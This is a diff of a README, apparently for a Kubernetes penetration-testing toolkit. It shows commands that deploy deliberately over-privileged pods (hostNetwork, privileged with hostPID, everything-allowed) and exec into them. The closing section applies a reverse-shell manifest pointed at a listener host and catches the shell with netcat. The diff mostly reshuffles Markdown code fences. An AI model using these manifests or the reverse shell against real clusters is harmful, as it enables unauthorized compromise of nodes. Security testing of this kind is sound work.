@@ -120,17 +120,21 @@ HOST="10.0.0.1" PORT="3118" envsubst < ./manifests/nothing-allowed/pod/nothing-a
 ```bash
 kubectl apply -f manifests/hostnetwork/cronjob/hostnetwork-exec-cronjob.yaml
 ```
+
+```
 cronjob.batch/hostnetwork-exec-cronjob created
 ```
-```
+
 Find the created pod
 ```bash
 kubectl get pods | grep cronjob
 ```
+
 ```
 NAME                                        READY   STATUS    RESTARTS   AGE
 hostnetwork-exec-cronjob-1607351160-gm2x4   1/1     Running   0          24s
 ```
+
 Exec into pod
 ```bash
 kubectl exec -it hostnetwork-exec-cronjob-1607351160-gm2x4 -- bash
@@ -139,15 +143,13 @@ kubectl exec -it hostnetwork-exec-cronjob-1607351160-gm2x4 -- bash
 ### Create a deployment of the priv-and-hostpid Pod
 ```bash
 kubectl apply -f manifests/priv-and-hostpid/deployment/priv-and-hostpid-exec-deployment.yaml
-```
-```
+ 
 deployment.apps/priv-and-hostpid-exec-deployment created
 ```
 Find the created pod
 ```bash
 kubectl get pods | grep deployment
-```
-```
+
 priv-and-hostpid-exec-deployment-65dbfbf947-qwpz9   1/1     Running   0          56s
 priv-and-hostpid-exec-deployment-65dbfbf947-tghqh   1/1     Running   0          56s
 ```
@@ -159,8 +161,7 @@ kubectl exec -it priv-and-hostpid-exec-deployment-65dbfbf947-qwpz9 -- bash
 ### Create all eight resouce types for the everything-allowed type
 ```bash
 find manifests/everything-allowed/ -name \*-exec-*.yaml -exec kubectl apply -f {} \;
-```
-```
+
 cronjob.batch/everything-allowed-exec-cronjob created
 daemonset.apps/everything-allowed-exec-deamonset created
 deployment.apps/everything-allowed-exec-deployment created
@@ -175,8 +176,7 @@ statefulset.apps/everything-allowed-exec-statefulset created
 View all of the created pods
 ```bash
 kubectl get pods
-```
-```
+
 NAME                                                  READY   STATUS    RESTARTS   AGE
 everything-allowed-exec-deamonset-qbrdb               1/1     Running   0          52s
 everything-allowed-exec-deployment-6cd7685786-rp65h   1/1     Running   0          51s
@@ -204,8 +204,7 @@ HOST="10.0.0.1" PORT="3116" envsubst < ./yaml/priv/pod-priv-revshell.yaml | kube
 Catch the shell 
 ```bash
 nc -nvlp 3116
-```
-```
+
 Listening on 0.0.0.0 3116
 Connection received on 10.0.0.162 42035
 ```
